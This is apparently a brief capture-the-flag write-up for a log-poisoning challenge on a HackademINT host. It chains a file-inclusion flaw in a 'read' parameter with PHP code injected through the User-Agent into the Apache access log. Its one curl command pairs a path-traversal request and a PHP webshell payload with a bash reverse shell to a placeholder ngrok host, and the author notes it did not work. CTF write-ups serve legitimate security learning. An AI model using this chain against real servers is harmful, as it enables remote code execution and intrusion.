#Poising log

First we need an LFI
The get parameter **read** allows to read any file.

Then, for the RCE, we use Apache logs. We inject code through the User-Agent

Doesn't work but the idea is here ...
```bash
curl 'http://challs2.hackademint.org:13405//index.php?read=../../../var/log/apache2/access.log&c=bash+-i+>%26+/dev/tcp/<NGROK TCP>/<PORT>+0>%261' -H "User-Agent: <?php system(\$_GET['c']); ?>"
```
